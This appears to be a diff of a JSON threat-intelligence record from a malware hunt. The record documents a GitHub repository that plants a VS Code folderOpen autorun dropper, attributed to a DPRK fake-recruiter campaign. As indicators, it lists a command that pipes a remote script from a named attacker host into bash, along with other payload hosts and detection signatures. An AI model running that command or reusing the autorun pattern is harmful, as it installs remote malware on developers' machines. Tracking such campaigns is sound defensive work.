@@ -14,15 +14,15 @@
     "attribution": "",
     "campaign_id": "GW-C-498a0aeb",
     "rules": "install_hook/vscode-autorun; obfuscation/atob",
-    "evidence_locations": ".vscode/tasks.json:0; src/.vscode/tasks.json:0; src/app/.vscode/tasks.json:0; src/app/services/.vscode/tasks.json:0; src/app/models/.vscode/tasks.json:0; src/app/components/.vscode/tasks.json:0; src/app/components/ticket-list/.vscode/tasks.json:0; src/app/components/ticket-detail/.vscode/tasks.json:0; public/.vscode/tasks.json:0; src/server.ts:19",
+    "evidence_locations": ".vscode/tasks.json:0; src/.vscode/tasks.json:0; src/app/.vscode/tasks.json:0; src/app/services/.vscode/tasks.json:0; src/app/models/.vscode/tasks.json:0; src/app/components/.vscode/tasks.json:0; src/app/components/ticket-list/.vscode/tasks.json:0; src/app/components/ticket-detail/.vscode/tasks.json:0; public/.vscode/tasks.json:0; src/server.ts:19; src/server.ts:154",
     "c2_hosts": "default-configuration.vercel.app",
     "iocs": "default-configuration.vercel.app; https://default-configuration.vercel.app/settings/linux?flag=9-test; curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash; .vscode/tasks.json",
-    "matched_signatures": "folderOpen curl filename:tasks.json",
-    "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 9)",
+    "matched_signatures": "settings/win?flag=; folderOpen curl filename:tasks.json",
+    "reasons": "Shares a confirmed-malware code signature ['settings/win?flag=', 'folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 9)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260928T024937Z",
-    "last_seen": "hunt-20260928T024937Z",
+    "first_seen": "hunt-20261005T094859Z",
+    "last_seen": "hunt-20261005T094859Z",
     "evidence_file": "repositories/pratikp72_taoufik_ticket_management.json",
     "reviewer_decision": "",
     "notes": ""
@@ -160,14 +160,21 @@
       "category": "obfuscation",
       "rule": "atob",
       "snippet": "const src = atob(process.env.AUTH_API_KEY);"
+    },
+    {
+      "file": "src/server.ts",
+      "line": 154,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "const src = atob(process.env.AUTH_API_KEY);"
     }
   ],
-  "commit_sha": "cfe3c6f739f2cc66aaa38a34908fc270c6908c84",
+  "commit_sha": "2faaf02a22380b5b0b19848abd685e9fc242dac5",
   "osm_report": {
     "report_type": "repository",
     "resource_identifier": "https://github.com/pratikp72/taoufik_ticket_management",
     "version_info": "all",
-    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json, src/.vscode/tasks.json, src/app/.vscode/tasks.json and 6 more files.\nOutbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json, src/.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nThe same dropper is planted in 9 directories.\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: default-configuration.vercel.app.\nCampaign GW-C-498a0aeb: one of 86 confirmed repos across 58 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including 260120.vercel.app, default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration.vercel.app.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json, src/.vscode/tasks.json, src/app/.vscode/tasks.json and 6 more files.\nOutbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json, src/.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nThe same dropper is planted in 9 directories.\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: default-configuration.vercel.app.\nCampaign GW-C-498a0aeb: one of 81 confirmed repos across 69 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration.vercel.app.\nFound by GitHub code search for a confirmed malware signature: settings/win?flag=; folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
     "payload_description": "Malicious payload found in: .vscode/tasks.json, src/.vscode/tasks.json, src/app/.vscode/tasks.json, src/app/services/.vscode/tasks.json, src/app/models/.vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json, src/.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed (+8 more)\n- Attacker hosts: default-configuration.vercel.app",
     "publisher": "pratikp72",
     "severity_level": "critical",
@@ -182,10 +189,10 @@
       "vscode-folderopen-autorun",
       "dropper"
     ],
-    "evidence_references": "https://github.com/pratikp72/taoufik_ticket_management/blob/cfe3c6f739f2cc66aaa38a34908fc270c6908c84/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/cfe3c6f739f2cc66aaa38a34908fc270c6908c84/src/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/cfe3c6f739f2cc66aaa38a34908fc270c6908c84/src/app/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/cfe3c6f739f2cc66aaa38a34908fc270c6908c84/src/app/services/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/cfe3c6f739f2cc66aaa38a34908fc270c6908c84/src/app/models/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/cfe3c6f739f2cc66aaa38a34908fc270c6908c84/src/app/components/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/cfe3c6f739f2cc66aaa38a34908fc270c6908c84/src/app/components/ticket-list/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/cfe3c6f739f2cc66aaa38a34908fc270c6908c84/src/app/components/ticket-detail/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/cfe3c6f739f2cc66aaa38a34908fc270c6908c84/public/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/cfe3c6f739f2cc66aaa38a34908fc270c6908c84/src/server.ts#L19",
+    "evidence_references": "https://github.com/pratikp72/taoufik_ticket_management/blob/2faaf02a22380b5b0b19848abd685e9fc242dac5/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/2faaf02a22380b5b0b19848abd685e9fc242dac5/src/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/2faaf02a22380b5b0b19848abd685e9fc242dac5/src/app/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/2faaf02a22380b5b0b19848abd685e9fc242dac5/src/app/services/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/2faaf02a22380b5b0b19848abd685e9fc242dac5/src/app/models/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/2faaf02a22380b5b0b19848abd685e9fc242dac5/src/app/components/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/2faaf02a22380b5b0b19848abd685e9fc242dac5/src/app/components/ticket-list/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/2faaf02a22380b5b0b19848abd685e9fc242dac5/src/app/components/ticket-detail/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/2faaf02a22380b5b0b19848abd685e9fc242dac5/public/.vscode/tasks.json\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/2faaf02a22380b5b0b19848abd685e9fc242dac5/src/server.ts#L19\nhttps://github.com/pratikp72/taoufik_ticket_management/blob/2faaf02a22380b5b0b19848abd685e9fc242dac5/src/server.ts#L154",
     "verified_iocs": "default-configuration.vercel.app\nhttps://default-configuration.vercel.app/settings/linux?flag=9-test\ncurl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-28T02:49:37Z",
-    "last_seen": "2026-09-28T02:49:37Z"
+    "first_seen": "2026-10-05T09:48:59Z",
+    "last_seen": "2026-10-05T09:48:59Z"
   }
 }
